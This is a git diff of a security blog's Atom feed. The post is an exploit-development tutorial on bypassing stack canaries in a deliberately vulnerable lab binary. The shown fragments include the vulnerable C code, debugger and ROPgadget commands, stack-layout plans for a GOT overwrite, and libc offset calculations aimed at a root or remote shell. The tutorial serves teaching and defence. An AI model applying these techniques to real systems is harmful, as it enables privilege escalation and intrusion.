@@ -4,7 +4,7 @@
   <title><![CDATA[Greyshell's Diary]]></title>
   <link href="http://greyshell.github.io/atom.xml" rel="self"/>
   <link href="http://greyshell.github.io/"/>
-  <updated>2019-08-10T11:10:47-07:00</updated>
+  <updated>2019-09-12T08:29:04-07:00</updated>
   <id>http://greyshell.github.io/</id>
   <author>
     <name><![CDATA[Abhijit S]]></name>
@@ -67,21 +67,21 @@
 </pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
 </span><span class='line'>#include &lt;string.h&gt;
 </span><span class='line'>#include &lt;stdlib.h&gt;
-</span><span class='line'> 
+</span><span class='line'>
 </span><span class='line'>struct contact {
 </span><span class='line'>  char name[20];
 </span><span class='line'>  char *description;
 </span><span class='line'>};
-</span><span class='line'> 
+</span><span class='line'>
 </span><span class='line'>void setup() {
 </span><span class='line'>  setvbuf(stdin, NULL, _IONBF, 0);
 </span><span class='line'>  setvbuf(stdout, NULL, _IONBF, 0);
 </span><span class='line'>  setvbuf(stderr, NULL, _IONBF, 0);
 </span><span class='line'>}
-</span><span class='line'> 
+</span><span class='line'>
 </span><span class='line'>int main() {
 </span><span class='line'>  struct contact c;
-</span><span class='line'> 
+</span><span class='line'>
 </span><span class='line'>  setup();
 </span><span class='line'>  memset(&c, 0, sizeof(c));
 </span><span class='line'>  c.description = malloc(100);
@@ -97,6 +97,14 @@
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>gcc vuln.c -o vuln</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>Exploit Scenario</strong></p>
+
+<ol>
+<li>During enumerating a system as a low privilege user, you found that the <code>suid</code> bit is set for this binary and the effective user is <code>root</code>.Now you would like to <code>escalate</code> your privilege to <code>root</code>.</li>
+<li>This binary is running on the network and you would like to break that remote system and get the <code>shell</code> access.</li>
+</ol>
 
 
 <h2>Binary &amp; OS Protection</h2>
@@ -183,7 +191,7 @@
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>readelf -a vuln | grep -i "entry" =&gt; Entry point address:               0x400670
-</span><span class='line'>objdump -d -M intel vuln </span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>objdump -d -M intel vuln</span></code></pre></td></tr></table></div></figure>
 
 
 <p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190711220750599.png" alt="image-20190711220750599.png" /></p>
@@ -432,7 +440,7 @@
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>0x7fffd9ce76b0: 0x4141414141414141      0x4141414141414141
-</span><span class='line'>                   |             |                      | 
+</span><span class='line'>                   |             |                      |
 </span><span class='line'>                   |             |                      this \x41 address is 0x7fffd9ce76b8
 </span><span class='line'>                   |             this \x41 address is 0x7fffd9ce76b0
 </span><span class='line'>                   |
@@ -790,7 +798,7 @@
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>pwndbg&gt; disassemble main
-</span><span class='line'>pwndbg&gt; b *0x0000000000400859 </span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>pwndbg&gt; b *0x0000000000400859</span></code></pre></td></tr></table></div></figure>
 
 
 <p>When we hit this break point,<code>.GOT</code> will not have the <code>__stack_chk_fail()</code> libc address as it is calling first time so it is not loaded yet.</p>
@@ -829,7 +837,7 @@
 <span class='line-number'>12</span>
 <span class='line-number'>13</span>
 <span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0x0000000000601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fbc0e4c4690 (puts) ◂— push   r12 
+</pre></td><td class='code'><pre><code class=''><span class='line'>0x0000000000601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fbc0e4c4690 (puts) ◂— push   r12
 </span><span class='line'>0x0000000000601020 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7fbc0e56e0f0 (__stack_chk_fail)
 </span><span class='line'>
 </span><span class='line'># 0x601020 - 0x601018 = 8 bytes
@@ -1130,21 +1138,21 @@
 <span class='line-number'>19</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'># scenario: 1
 </span><span class='line'>0x7ffc50cc5178 =&gt; when EIP = deadbeef, RSP points here
-</span><span class='line'>0x7ffc50cc5180 =&gt; input name 
-</span><span class='line'>0x7ffc50cc5188 =&gt; input name 
-</span><span class='line'>0x7ffc50cc5190 =&gt; input name 
-</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address 
-</span><span class='line'>0x7ffc50cc51a8 =&gt; pad bytes (DDDDDDDD) 
+</span><span class='line'>0x7ffc50cc5180 =&gt; input name
+</span><span class='line'>0x7ffc50cc5188 =&gt; input name
+</span><span class='line'>0x7ffc50cc5190 =&gt; input name
+</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address
+</span><span class='line'>0x7ffc50cc51a8 =&gt; pad bytes (DDDDDDDD)
 </span><span class='line'>0x7ffc50cc51b0 =&gt; canary (EEEEEEEE)
 </span><span class='line'>0x7ffc50cc51b8 =&gt; EBP (FFFFFFFF)
 </span><span class='line'>
 </span><span class='line'># scenario: 2
 </span><span class='line'>0x7ffc50cc5178 =&gt; EIP = (5 POP + RETN) gadget address
-</span><span class='line'>0x7ffc50cc5180 =&gt; input name 
-</span><span class='line'>0x7ffc50cc5188 =&gt; input name 
-</span><span class='line'>0x7ffc50cc5190 =&gt; input name 
-</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address 
-</span><span class='line'>0x7ffc50cc51a8 =&gt; pad bytes (DDDDDDDD) 
+</span><span class='line'>0x7ffc50cc5180 =&gt; input name
+</span><span class='line'>0x7ffc50cc5188 =&gt; input name
+</span><span class='line'>0x7ffc50cc5190 =&gt; input name
+</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address
+</span><span class='line'>0x7ffc50cc51a8 =&gt; pad bytes (DDDDDDDD)
 </span><span class='line'>0x7ffc50cc51b0 =&gt; canary (EEEEEEEE) =&gt; RSP points here
 </span><span class='line'>0x7ffc50cc51b8 =&gt; EBP (FFFFFFFF)</span></code></pre></td></tr></table></div></figure>
 
@@ -1158,7 +1166,7 @@
 </pre></td><td class='code'><pre><code class=''><span class='line'>[+] find the 'POP POP POP POP POP POP RETN' gadget:
 </span><span class='line'>ROPgadget --binary vuln | grep pop
 </span><span class='line'>[SNIPPED..]
-</span><span class='line'>0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret   =&gt; selecting this gadget </span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret   =&gt; selecting this gadget</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Update the <code>exploit_v04.py</code> with the <code>ROPgadget</code> address => <code>0x00000000004008bb</code>, replace <code>DDDDDDDD</code> with <code>0xdeadbeef</code>.</p>
@@ -1449,10 +1457,10 @@
 <span class='line-number'>9</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'># scenario: 2
 </span><span class='line'>0x7ffc50cc5178 =&gt; EIP = (5 POP + RETN) gadget address
-</span><span class='line'>0x7ffc50cc5180 =&gt; input name 
-</span><span class='line'>0x7ffc50cc5188 =&gt; input name 
-</span><span class='line'>0x7ffc50cc5190 =&gt; input name 
-</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address 
+</span><span class='line'>0x7ffc50cc5180 =&gt; input name
+</span><span class='line'>0x7ffc50cc5188 =&gt; input name
+</span><span class='line'>0x7ffc50cc5190 =&gt; input name
+</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address
 </span><span class='line'>0x7ffc50cc51a8 =&gt; `0xdeadbeef`: replace with `POP RDI; RETN` gadget address - `0x00000000004008c3`
 </span><span class='line'>0x7ffc50cc51b0 =&gt; `canary` (`EEEEEEEE`): replace with `0000000000601030`=&gt; (malloc .GOT)
 </span><span class='line'>0x7ffc50cc51b8 =&gt; EBP (FFFFFFFF): replace with `0xdeadbeef`</span></code></pre></td></tr></table></div></figure>
@@ -1718,7 +1726,7 @@
 </span><span class='line'>system_offset = 0x7fb0b924d390 - 0x7fb0b928c130 (libc_malloc_leak)
 </span><span class='line'>system_address = libc_leak + system_offset
 </span><span class='line'>
-</span><span class='line'>pwndbg&gt; search "/bin/sh" =&gt; 0x7fb0b9394d57 
+</span><span class='line'>pwndbg&gt; search "/bin/sh" =&gt; 0x7fb0b9394d57
 </span><span class='line'>bin_sh_offset = 0x7fda54c56d57 - 0x7fb0b928c130 (libc_malloc_leak)
 </span><span class='line'>bin_sh_address = libc_leak + bin_sh_offset</span></code></pre></td></tr></table></div></figure>
 
@@ -2034,14 +2042,6 @@
 
 <p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727160539468.png" alt="image-20190727160539468" /></p>
 
-<p><strong>Exploitation Usecase</strong></p>
-
-<ol>
-<li>You have access to a system as a normal user. During enumeration, you found that the <code>suid</code> bit is set for this binary and the effective user is <code>root</code>. You would like to <code>escalate</code> your privilege to <code>root</code>.</li>
-<li>You found that this binary is running on the network and you would like to <code>compromise</code> that remote system.</li>
-</ol>
-
-
 <h2>Conclusion</h2>
 
 <p>We can prevent this exploitation by restricting the input within the size of the buffer.</p>
@@ -2075,11 +2075,11 @@
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(playbook) ╭─asinha@ubuntu01 ~/exploit-dev/vampire_class/bypass_canary_02 
+</pre></td><td class='code'><pre><code class=''><span class='line'>(playbook) ╭─asinha@ubuntu01 ~/exploit-dev/vampire_class/bypass_canary_02
 </span><span class='line'>╰─$ gcc -fpie -pie -Wl,-z,relro,-z,now -o vuln_hardened vuln.c
 </span><span class='line'>
-</span><span class='line'>(playbook) ╭─asinha@ubuntu01 ~/exploit-dev/vampire_class/bypass_canary_02 
-</span><span class='line'>╰─$ checksec vuln_hardened 
+</span><span class='line'>(playbook) ╭─asinha@ubuntu01 ~/exploit-dev/vampire_class/bypass_canary_02
+</span><span class='line'>╰─$ checksec vuln_hardened
 </span><span class='line'>[*] '/home/asinha/exploit-dev/vampire_class/bypass_canary_02/vuln_hardened'
 </span><span class='line'>    Arch:     amd64-64-little
 </span><span class='line'>    RELRO:    Full RELRO
